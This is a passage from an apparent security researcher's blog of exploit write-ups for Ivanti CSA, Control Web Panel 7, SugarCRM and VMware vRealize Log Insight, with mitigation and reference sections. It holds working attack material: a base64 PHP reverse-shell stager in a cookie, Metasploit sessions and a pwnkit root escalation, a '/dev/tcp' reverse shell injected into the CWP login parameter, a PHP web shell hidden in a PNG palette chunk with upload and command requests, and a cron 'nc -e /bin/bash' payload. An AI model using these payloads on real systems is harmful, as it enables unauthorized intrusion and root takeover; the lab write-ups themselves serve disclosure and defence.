Cookie: thisisnice=ab; skipthisone=; alsoskipthisone=; executethisone=Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMTAwLjcnOyAkcG9ydCA9IDQ0NDQ7IGlmICgoJGYgPSAnc3RyZWFtX3NvY2tldF9jbGllbnQnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOyAkc190eXBlID0gJ3N0cmVhbSc7IH0gaWYgKCEkcyAmJiAoJGYgPSAnZnNvY2tvcGVuJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoJGlwLCAkcG9ydCk7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7ICRzID0gJGYoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOyAkcmVzID0gQHNvY2tldF9jb25uZWN0KCRzLCAkaXAsICRwb3J0KTsgaWYgKCEkcmVzKSB7IGRpZSgpOyB9ICRzX3R5cGUgPSAnc29ja2V0JzsgfSBpZiAoISRzX3R5cGUpIHsgZGllKCdubyBzb2NrZXQgZnVuY3MnKTsgfSBpZiAoISRzKSB7IGRpZSgnbm8gc29ja2V0Jyk7IH0gc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRsZW4gPSBmcmVhZCgkcywgNCk7IGJyZWFrOyBjYXNlICdzb2NrZXQnOiAkbGVuID0gc29ja2V0X3JlYWQoJHMsIDQpOyBicmVhazsgfSBpZiAoISRsZW4pIHsgZGllKCk7IH0gJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsgJGxlbiA9ICRhWydsZW4nXTsgJGIgPSAnJzsgd2hpbGUgKHN0cmxlbigkYikgPCAkbGVuKSB7IHN3aXRjaCAoJHNfdHlwZSkgeyBjYXNlICdzdHJlYW0nOiAkYiAuPSBmcmVhZCgkcywgJGxlbi1zdHJsZW4oJGIpKTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRiIC49IHNvY2tldF9yZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgfSB9ICRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsgJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsgaWYgKGV4dGVuc2lvbl9sb2FkZWQoJ3N1aG9zaW4nKSAmJiBpbmlfZ2V0KCdzdWhvc2luLmV4ZWN1dG9yLmRpc2FibGVfZXZhbCcpKSB7ICRzdWhvc2luX2J5cGFzcz1jcmVhdGVfZnVuY3Rpb24oJycsICRiKTsgJHN1aG9zaW5fYnlwYXNzKCk7IH0gZWxzZSB7IGV2YWwoJGIpOyB9IGRpZSgpOw==; b=; c=;
User-Agent: curl/7.86.0
Accept: */*
Connection: close
```
**Metasploit**
```console
msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 0.0.0.0:4444
msf6 exploit(multi/handler) > [*] Sending stage (39927 bytes) to 192.168.100.41
[*] Meterpreter session 1 opened (192.168.100.7:4444 -> 192.168.100.41:59422) at 2023-01-08 10:00:10 +0000

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer    : localhost.localdomain
OS          : Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: nobody
meterpreter >
```
The appliance has a rich set of tooling such as `python`, `netcat`, `bash`, `perl` and others installed so the attack surface is pretty broad.
One point of attention however is that the attack surface for the appliances running in the wild might be restricted because of the hardening. For instance, most of the appliances only allow in and outbound traffic on port 80 and 443 (see [Hardening CSA appliance](https://forums.ivanti.com/s/article/How-to-harden-the-CSA-4-3-4-4?language=en_US)).

### Additional privilege escalation
If you have established a foothold on the appliance, you can get to `root` because the underlying CentOS is vulnerable to [CVE-2021-4034](https://attackerkb.com/topics/JGooJTBk81/cve-2021-4034).
```console
msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > options

Module options (exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   PKEXEC_PATH                    no        The path to pkexec binary
   SESSION       1                yes       The session to run this module on
   WRITABLE_DIR  /tmp             yes       A directory where we can write files


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.100.7    yes       The listen address (an interface may be specified)
   LPORT  5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   x86_64



View the full module info with the info, or info -d command.

msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit

[*] Started reverse TCP handler on 192.168.100.7:5555
[*] Running automatic check ("set AutoCheck false" to disable)
[!] Verify cleanup of /tmp/.zcbstvgmiy
[+] The target is vulnerable.
[*] Writing '/tmp/.shmkphpno/qwsfmu/qwsfmu.so' (548 bytes) ...
[!] Verify cleanup of /tmp/.shmkphpno
[*] Sending stage (3045348 bytes) to 192.168.100.41
[+] Deleted /tmp/.shmkphpno/qwsfmu/qwsfmu.so
[+] Deleted /tmp/.shmkphpno/.xlfjhsej
[+] Deleted /tmp/.shmkphpno
[*] Meterpreter session 2 opened (192.168.100.7:5555 -> 192.168.100.41:43842) at 2023-01-08 10:25:05 +0000

meterpreter > getuid
Server username: root
meterpreter >
```
I have created a  Metasploit module that has been submitted to the mainstream for production.  A local version of this module can found at the **References** section.

## Mitigation
Follow the guidance in security advisory [Ivanti Security Advisory 2021-12-02](https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US).

## References
[Ivanti Security Advisory 2021-12-02](https://forums.ivanti.com/s/article/SA-2021-12-02?language=en_US)
[Packetstorm](https://packetstormsecurity.com/files/166383/Ivanti-Endpoint-Manager-CSA-4.5-4.6-Remote-Code-Execution.html)
[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)

### Credits
Credits goes to the security researchers below who discovered and analyzed this vulnerability.
* [Jakub Kramarz](https://twitter.com/lenwenet)
* [William Wallace](https://twitter.com/phyr3wall)
* [d7x](https://twitter.com/d7x_real)




---

## CVE-2022-44877
*Posted 2023-01-14 · last revised 2023-01-19*

> login/index.php in CWP (aka Control Web Panel or CentOS Web Panel) 7 before 0.9.8.1147 allows remote attackers to execute arbitrary OS commands via shell metacharacters in the login parameter.

This vulnerability is all about **"Why Quotes Matter"**

In December 2022,  security researcher `Numan Türle` from `Gais Cyber Security` discovered an unauthenticated remote code execution vulnerability in the Control Web Panel 7 (CWP) application. They state on their [website](https://control-webpanel.com/) that CWP is a World Leading advanced Free and PRO web hosting panel that gives you all the flexibility to effectively and efficiently manage your server and clients.  

The vulnerability is exposed thru the admin endpoint `/login/index.php?login` which typically runs on port `2030` or `2086` for `http` and port `2031` and port `2087` for `https`. Successful exploitation results in command execution as the `root` user. CWP versions `0.9.8.1146` and below are vulnerable.

The issue is triggered by the improper use of quotes when a failed login entry is logged in the `/var/log/cwp_client_login.log`.
The example below shows why the proper usage of quotes is important when applied in a unix shell.
```console
[root@localhost ~]# echo "$(whoami)"
root
[root@localhost ~]# echo '$(whoami)'
$(whoami)
[root@localhost ~]# echo "'$(whoami)'"
'root'
[root@localhost ~]# echo ''$(whoami)''
root
```
In the first example, the inline bash command `$(whoami)` gets executed within the `echo` command using double quotes.
However, if you use single quotes, it is treated as text which is the standard unix shell behavior. But if you try to be smart and put double quotes around the single quotes, it again executes `$(whoami)` because the single quotes are seen as text if surrounded by double quotes.
This is no secret to experienced unix admins, but typically software developers can be easily tricked when they use underlying unix shell commands and quotes in their programs.

And this is exactly the problem that triggers this vulnerability.
Let's have a quick look, what is going under the hood....

Take the burp request below, where we will trigger a failed login entry using the existing default user `root` with a wrong password.
```
POST /login/index.php?login= HTTP/1.1
Host: 192.168.100.89:2031
Content-Length: 46
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en
Connection: close

username=root&password=idonotcare&commit=Login
```
If we monitor the `/var/log/cwp_client_login.log` then we can see an failed login entry.
```console
[root@localhost ~]# tail -f /var/log/cwp_client_login.log
2023-01-14 17:37:04 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login='
```
If we do the same burp request, but now with our `$(whoami)` added.
And surprise, surprise, the `whoami` command gets executed (see second log entry).
```console
[root@localhost ~]# tail -f /var/log/cwp_client_login.log
2023-01-14 17:37:04 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login='
2023-01-14 17:40:25 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login=root'
```
Now lets take a reverse bash shell.
```
POST /login/index.php?login=$(bash -i >& /dev/tcp/192.168.100.7/4444 0>&1) HTTP/1.1
Host: 192.168.100.89:2031
Content-Length: 46
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en
Connection: close

username=root&password=idonotcare&commit=Login
```
And voila, a reverse shell as `root` user on the target.
```console
# nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.100.89.
Ncat: Connection from 192.168.100.89:51988.
bash: no job control in this shell
[root@localhost login]# whoami
whoami
root
You have new mail in /var/mail/root
[root@localhost login]#
```
Another interesting piece is that you actually can see the command running in the process list that is writing the log entry to the log file.
You can clearly see the improper use of the double quotes in this command line.
```console
root     12238 12231  0 03:41 ?        00:00:00 sleep 17897
root     12493   910  0 03:43 ?        00:00:37 php-fpm: pool cwpsrv
postfix  27739  1538  0 07:41 ?        00:00:00 pickup -l -t fifo -u -o content_filter= -o receive_override_options=no_header_body_checks
root     29668     2  0 08:02 ?        00:00:00 [kworker/0:3]
root     30160     2  0 08:10 ?        00:00:00 [kworker/0:1]
root     30718     2  0 08:15 ?        00:00:00 [kworker/0:0]
root     30869  7118  0 08:17 ?        00:00:00 sh -c echo "2023-01-14 13:17:46 root Failed Login from: 192.168.100.7 on: 'https://localhost:2031/login/index.php?login=$(bash -i >& /dev/tcp/192.168.100.7/4444 0>&1)'" >> /var/log/cwp_client_login.log
```

If you want to test it yourself, please follow this [guidance](https://control-webpanel.com/installation-instructions#step1) to build a vulnerable configuration. Please do not expose this to the Internet unless you want to be compromised ;-)
Before you execute step 7. `sh cwp-el7-latest`, please edit the file and make the following adjustments to download the vulnerable version and prevent the auto update.
```bash
nano /usr/local/src/cwp-el7-latest
>>>>>
# wget static.cdn-cwp.com/files/cwp/el7/cwp-el7-0.9.8.1148.zip
# unzip -o -q cwp-el7-0.9.8.1148.zip
# rm -f cwp-el7-0.9.8.1148.zip

wget static.cdn-cwp.com/files/cwp/el7/cwp-el7-0.9.8.1146.zip
unzip -o -q cwp-el7-0.9.8.1146.zip
>>>>>
# update cwp
chmod +x /scripts/cwp_api
# sh /scripts/update_cwp
sh /scripts/cwp_set_memory_limit
>>>>>
```
After running the installation script which takes about 30 minutes, please rename `/usr/local/cwpsrv/htdocs/resources/scripts/update_cwp` to `update_cwp.something` otherwise CWP will get updated to the latest version when you start the application.
 
## Mitigation
The CWP application has an auto update feature that can not be disabled in the application. Therefore the likelihood to find any vulnerable CWP application in the wild is almost zero.

I have created a  Metasploit module. A local version of this module can found at the **References** section.

## References
[Github](https://github.com/numanturle/CVE-2022-44877)
[Packetstorm](https://packetstormsecurity.com/files/170388/Control-Web-Panel-7-Remote-Code-Execution.html)
[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)

### Credits
Credits goes to the security researcher below who discovered and analyzed this vulnerability.
* [Numan Türle](https://twitter.com/numanturle/)


---

## CVE-2023-22952
*Posted 2023-01-18 · last revised 2023-03-13*

> In SugarCRM before 12.0. Hotfix 91155, a crafted request can inject custom PHP code through the EmailTemplates because of missing input validation.

Last December, 28th 2022,  a zero.day vulnerability in the SugarCRM application was [disclosed](https://seclists.org/fulldisclosure/2022/Dec/31) by `sw33t.0day`. SugarCRM is a popular CRM application that is used by thousands of customers and the latest run of `shodan` shows more than **5600** instances active on the Internet. 
It is fair to say that not all instances are vulnerable. There is a fast amount of SugarCRM Community Editions amongst them that are not affected by this vulnerability. 

For the vulnerable versions, please check the security advisory [sugarcrm-sa-2023-001](https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/) from the vendor.

The vulnerability in sugarCRM could allow an unauthenticated attacker to upload a malicious PNG file with embedded PHP code to the `/cache/images/` directory on the web server. Once uploaded to the server, depending on server configuration, the attacker may be able to execute that code over the web via `HTTP` or `HTTPS` gaining access to the system.

The vulnerability is caused by two issues in the code base of sugarCRM. 

First issue is  a missing authentication check in the `loadUser()` method in `include/MVC/SugarApplication.php`.
After a failed login, the session does not get destroyed and hence the attacker can continue to send valid requests to the application.
The burp request below shows this behavior.

**Authentication request and response from a vulnerable instance**
```html
POST /index.php HTTP/1.1
Host: TARGET:80
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Connection: close

module=Users&action=Authenticate&user_name=brenda&user_password=DbLiL98a
```
Response is a HTTP 500 message and the response says `You must specify a valid username and password.` Could be different depending on the language settings.
```html
HTTP/1.0 500 Server Error
Date: Wed, 18 Jan 2023 05:54:58 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly;
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly;
Set-Cookie: PHPSESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/; HttpOnly
Status: 500 Server Error
Set-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly;
Content-Length: 47
Connection: close
Content-Type: text/html; charset=UTF-8

You must specify a valid username and password.
```
After applying the suggested fix below from the vendor, the session information gets destroyed after a failed login and further request will fail.
```php
//If there was a login error, we should not allow the further code execution and destroy the session

if (isset($_SESSION['login_error'])) {

if ($sess->getId()) {

$sess->destroy();

};

header('Location: ' . $this->getUnauthenticatedHomeUrl(true));

exit();

}
```
Burp response after the patch, where the response says `You need to be logged in to perform this action.`
```html
HTTP/1.0 500 Server Error
Date: Tue, 17 Jan 2023 07:23:56 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=cf6361a9-6222-45f4-bcfb-08d0dc88376e; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
Status: 500 Server Error
Content-Length: 49
Connection: close
Content-Type: text/html; charset=UTF-8


You need to be logged in to perform this action.
```

The second issue is around the ability to upload of a malicious PNG file with PHP code embedded that can be executed by the attacker.
The vulnerable endpoint is  `/index.php?module=EmailTemplates&action=AttachFiles`

There is a good reference [Persistent PHP payloads in PNGs](https://www.synacktiv.com/en/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) that explains very well how to build a malicious PNG file with PHP code embedded.
The are several ways to hide web shell code into a PNG to make the upload of such malicious PNG successful. 
In this case,  we will embed the web shell code into a so called PLTE chunk which stores the color palette code of a PNG.
This PLTE chunk is a critical chunk of data that does not get compressed when uploading a PNG which typically a lot of web applications do nowadays.

The PLTE chunk contains from 1 to 256 palette entries, each a three-byte series of the form:

> Red:   1 byte (0 = black, 255 = red)
> Green: 1 byte (0 = black, 255 = green)
> Blue:  1 byte (0 = black, 255 = blue)

Using the PLTE chunk, we potentially have 256*3 bytes available to inject our payload into such a critical chunk, which should be more than enough. The only constraint being that the length of the payload must be divisible by 3.

Our main objective is to keep our web shell small and keep it flexible to accommodate large payloads to avoid the restrictions 768 bytes and the length of the payload.  By using a PHP payload like  `<?=$_GET[0](base64_decode($_POST[1]));?>`, it will satisfy those requirements where you externalize the actual payload to be delivered to the target and can modify the PHP shell command functions during runtime such as `exec()`, `passthru()`, `shell_exec()` and `system()`. 
See `curl` examples below.
```console
# echo 'ls -l' | base64 
bHMgLWwK
# curl -XPOST -d '1=bHMgLWw=' 'http://localhost/yohoo.phar?0=passthru' -o -
# curl -XPOST -d '1=bHMgLWw=' 'http://localhost/yohoo.phar?0=system' -o -
# curl -XPOST -d '1=bHMgLWw=' 'http://localhost/yohoo.phar?0=shell_exec' -o -
```

The burp requests below shows a success upload of the malicious PNG with PHP code embedded at a vulnerable target followed by a successful command injection.

**Malicious PNG File upload**
```html
POST /index.php HTTP/1.1
Host: TARGET:80
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWeTJtA8WByYIQMGR
Content-Length: 601
Connection: close

------WebKitFormBoundaryWeTJtA8WByYIQMGR
Content-Disposition: form-data; name="action"

AttachFiles
------WebKitFormBoundaryWeTJtA8WByYIQMGR
Content-Disposition: form-data; name="module"

EmailTemplates
------WebKitFormBoundaryWeTJtA8WByYIQMGR
Content-Disposition: form-data; name="file"; filename="yohoo.phar"
Content-Type: image/png

PNG

--Garbled binary text--<?=$_GET[0](base64_decode($_POST[1]));?>--Garbled binary text--
------WebKitFormBoundaryWeTJtA8WByYIQMGR--
```
Successful response of the upload will show the file entry at end of the response.
```html
HTTP/1.1 200 OK
Date: Wed, 18 Jan 2023 05:55:00 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5; path=/; HttpOnly
Vary: Accept-Encoding
Content-Length: 4460
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang='en_us'>
<head>
---- A LOT of HTML CRAP ----
<div id="main">
    <div id="content">
                <table style="width:100%" id="contentTable"><tr><td>
        ["cache\/images\/yohoo.phar"]
```
**Command execution of `ls -l`**
```html
POST /cache/images/yohoo.phar?0=passthru HTTP/1.1
Host:TARGET:80
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Cookie: PHPSESSID=06457e85-5a6c-4428-880a-8e5134137650
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

1=bHMgLWwK
```
Remote command execution response
```html
HTTP/1.1 200 OK
Date: Mon, 16 Jan 2023 16:23:10 GMT
Server: Apache/2.4.10 (Debian)
Vary: Accept-Encoding
Content-Length: 1209
Connection: close
Content-Type: text/html; charset=UTF-8

PNG

--Garbled binary text--total 76
-rw-r--r-- 1 www-data www-data 207 Jan 16 14:38 yohoo.phar
--Garbled binary text--
```
You can of course vary the 0 parameter with other PHP shell command functions such as `exec`, `shell_exec` or `system`.

## Evidence of compromise
When you want to check if your system is compromised, please look for unexpected files in the `/cache/images/` directory. The published [exploit](https://packetstormsecurity.com/files/170346/SugarCRM-Shell-Upload.html) had a filename `sweet.phar` that was not cleaned. However, attackers have changed these filenames  such as `imagefile.phar`, `meow.phar`, `rvsm.phar`, `aws.phar`, and are using files with other extensions. 
Also be conscious of the fact that the files might have been cleaned up by the attacker to cover their tracks.

Other evidence might be failed execution request for files under the `/cache/images/` directory with the extension `php`, `phar`, `phtml`, `php7`, or any other executable extension **NOT** allowed by your web server configuration. The response codes can be found in your web server logs, such as `404` – the file was not found or `403` – the access was denied by web server. 

## Mitigation
Please follow the guidelines from the vendor to patch your system [January 5, 2023: Security vulnerability update and FAQ] (https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update) or configure additional security settings in your web server such as preventing PHP code parsing/execution using `.htaccess setting` file in `/cache/images/` directory and/or prevent PHP code execution by updating security settings in the `php.ini` file. Lots of security guidance is available on the Internet. 
Another less obvious security measure to consider is to enable `SAML` authentication that will mitigate the authentication bypass issue, hence will protect you against unauthenticated malicious file uploads.

I have created a `Metasploit` module to test this vulnerability. A local version of this module can found at the **References** section.
[Submission](https://github.com/rapid7/metasploit-framework/pull/17507) to Metasploit mainstream is completed and module is in production.

## References
[Full Disclosure](https://seclists.org/fulldisclosure/2022/Dec/31)
[Public Exploit - Packetstorm](https://packetstormsecurity.com/files/170346/SugarCRM-Shell-Upload.html)
[Security Advisory - sugarcrm-sa-2023-001](https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-001/)
[January 5, 2023: Security vulnerability update and FAQ] (https://sugarclub.sugarcrm.com/engage/b/sugar-news/posts/jan-5-2023-security-vulnerability-update)
[Encoding web shells in PNG IDAT chunks](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
[Persistent PHP payloads in PNGs] (https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html)
[Metasploit Development h00die-gr3y] (https://github.com/h00die-gr3y/Metasploit/blob/main/README.md)

### Credits
Credits goes to `sw33t.0day` below who discovered  this vulnerability.



---

## CVE-2022-31706
*Posted 2023-02-03 · last revised 2023-02-11*

> The vRealize Log Insight contains a Directory Traversal Vulnerability. An unauthenticated, malicious actor can inject files into the operating system of an impacted appliance which can result in remote code execution.

On 31 January 2023,  security researcher `James Horman` and team from `Horizon3.ai` published a Technical Deep Dive on vulnerabilities that exist in `VMware vRealize Log Insight` and how to exploit those to get unauthenticated remote access to the application. Please read the blog [VMware vRealize Log Insight VMSA-2023-0001 Technical Deep Dive](https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/) for all the technical details.

What makes this use case particular interested is the chaining of multiple vulnerabilities to achieve the unauthenticated RCE.
Basically there are four vulnerabilities that are published in the VMware [VMSA-2023-0001](https://www.vmware.com/security/advisories/VMSA-2023-0001.html) security disclosure:
- `CVE-2022-31706`: VMware vRealize Log Insight Directory Traversal Vulnerability
- `CVE-2022-31704`: VMware vRealize Log Insight broken Access Control Vulnerability
- `CVE-2022-31710`: VMware vRealize Log Insight Deserialization Vulnerability
- `CVE-2022-31711`: VMware vRealize Log Insight Information Disclosure Vulnerability

The [analysis](https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/)  shows that  three vulnerabilities `CVE-2022-31706`,  `CVE-2022-31704` and `CVE-2022-31711` are chained to achieve the RCE.

In a nutshell:
1. `CVE-2022-31704` is used to gain unauthorized access to the `Apache Thrift` server to execute commands. `Apache Thrift` is a RPC framework that allows client/server communication and is typically used to establish communication between components of the system. 
2. The `Apache Thrift` server in the VMware vRealize Log Insight application is vulnerable and can be accessed with a client to execute specific commands defined in the framework. 
3. In this scenario, two RPC commands are being exploited, `remotePakDownloadCommand` and `pakUpgradeCommand ` that allows for an unauthenticated upload of a malicious PAK file with an attached payload that can be extracted to any place on the filesystem using `CVE-2022-31706` that allows for Directory Traversal.
4. Last but not least,  the `remotePakDownloadCommand` requires a node token to work. A node token is a `guid` that is unique per instance of Log Insight. This information is not readily available to an unauthenticated user. However, there are various `Thrift` RPC commands that leak the node token including `getConfig` and `getHealthStatus`, which links back to  the third `CVE-2022-31711` - VMware vRealize Log Insight Information Disclosure Vulnerability.

Now let's see in real-life practice, how this vulnerability works...

First we need install a vulnerable instance of  VMware vRealize Log Insight, which you can download from this [link](https://customerconnect.vmware.com/downloads/info/slug/infrastructure_operations_management/vmware_vrealize_log_insight/8_8). 
You need to be registered as a customer or you can apply for a trial license before you can download the OVA.
Import the OVA in your favorite hypervisor application. I am using Oracle VirtualBox. 
Please allocate enough memory and CPU (minimal 4 GB and 2 vCPU) otherwise your appliance will be dead slow and the exploit will fail due to lack of space in the `/tmp` directory.

Go thru the setup of the appliance. This is all very straight forward. 
If you have the appliance  running, go to the [POC](https://github.com/horizon3ai/vRealizeLogInsightRCE) at Github that has been created by the `Horizon3.ai` team.
Clone the repository.
Before you start executing the exploit, please install `Thrift` python support.
```console
#  pip3 install thrift
```
and install the `thrift-compiler`. 
Not needed for the exploit to work but it gives you the ability to generate thrift modules for other languages such as `ruby`.
```console
# apt install thrift-compiler
``` 

The last thing that you need to do is to correct a small typo that the guys from `Horizon3.ai` made in their code. 
Yeah, everybody makes mistakes, even these guys ;-)

Open `VMSA-2023-0001.py` with your  favorite editor and go to the section below.
```python
def remote_pak_download(client, node_token, http_server_address, http_server_port):
    command = Command()
    command.commandType = 9

    download_command = RemotePakDownloadCommand()
    download_command.sourceNodeToken = node_token
    # The remote system does not return an error if this url is incorrect.
    # It just silently fails
    download_command.requestUrl = f"http://{http_server_address}:{http_server_port}/exploit.tar"
    download_command.fileName = "exploit.pak"

    command.remotePakDownloadCommand = download_command
```
Change `download_command.fileName = "exploit"` to `download_command.fileName = "exploit.pak"` and save the file.

Now we are ready to run the exploit against our installed target.
- The exploit will gain access by obtaining the token.
- Next, it will create a malicious PAK file with the payload attached that is a crontab file with a `netcat` command connecting back to your system.
- PAK file gets upload and extracted using the vulnerable `Apache Thrift` server running on the Log Insight server.
- Run a `netcat` listener on your system to catch the `netcat` connection from the target system triggered by the `cron` daemon after successful exploitation.

```console
# python3 ./VMSA-2023-0001.py --target_address 192.168.100.92 --http_server_address 192.168.100.7 --http_server_port 1981 --payload_file payload --payload_path /etc/cron.d/exploit
[+] Using CVE-2022-31711 to leak node token
[+] Found node token: 8984be67-2394-4da1-bf87-2635d558329d
[+] Using CVE-2022-31704 to trigger malicious file download
192.168.100.92 - - [03/Feb/2023 17:19:02] "GET /exploit.tar HTTP/1.1" 200 -
[+] File successfully downloaded
[+] Using CVE-2022-31706 to trigger directory traversal and write cron reverse shell
[+] Payload successfully delivered
# nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.100.7] from (UNKNOWN) [192.168.100.92] 42746
uname -a
Linux localhost 4.19.245-1.ph3 #1-photon SMP Thu Jun 2 02:30:39 UTC 2022 x86_64 GNU/Linux
whoami
root
cat /etc/issue
VMware vRealize Log Insight
cat /etc/photon-release
VMware Photon OS 3.0
PHOTON_BUILD_NUMBER=05f9d3d8d
```
If you login into the appliance, you can find the `exploit.pak` in the `/tmp` directory and the a cron file `exploit` created in the `/etc/cron.d` directory.
If you check the contents of the PAK file,  you will see the `../../etc/crond.d/exploit` file with the directory traversal.
```console
root@localhost [ ~ ]# ls -l /tmp/*.pak
-rw-r--r-- 1 root root 122880 Feb  3 17:18 /tmp/exploit.pak
root@localhost [ ~ ]# ls -l /etc/cron.d/exploit
-rw-r--r-- 1 root root 51 Feb  3 12:24 /etc/cron.d/exploit
root@localhost [ ~ ]# cat /etc/cron.d/exploit
* * * * * root nc -e /bin/bash 192.168.100.7 8888

root@localhost [ ~ ]# tar -tvf/tmp/exploit.pak
-rw-r--r-- root/root     35768 2023-02-03 09:10 upgrade-image-8.10.2-21145187.rpm
-rw-r--r-- root/root     35768 2023-02-03 09:10 upgrade-driver
-rw-r--r-- root/root     35768 2023-02-03 09:10 eula.txt
-rw-r--r-- root/root      1926 2023-02-03 09:10 VMware-vRealize-Log-Insight.cert
-rw-r--r-- root/root      1790 2023-02-03 09:10 VMware-vRealize-Log-Insight.mf
tar: Removing leading `../../' from member names
-rw-r--r-- root/root        51 2023-02-03 12:24 ../../etc/cron.d/exploit
```
The example above show that the exploit is pretty simple to weaponize and execute, however there is a low probability of exploitation in the wild.
The main reason is that `VMware vRealize Log Insight` is typically not exposed to the public Internet and the `Thrift` RPC ports `16520` through `16580` should be accessible for the exploit to work. 
But from the inside, it is of course a very attractive target to exploit because it has tons of nice information on the network and servers ready to be disclosed to an attacker.

## Mitigation
Please update `VMware vRealize Log Insight` to `8.10.2`.

## References
[Horizon3.ai: VMware vRealize Log Insight VMSA-2023-0001 Technical Deep Dive](https://www.horizon3.ai/vmware-vrealize-log-insight-vmsa-2023-0001-technical-deep-dive/) 
[VMware advisory](https://www.vmware.com/security/advisories/VMSA-2023-0001.html)
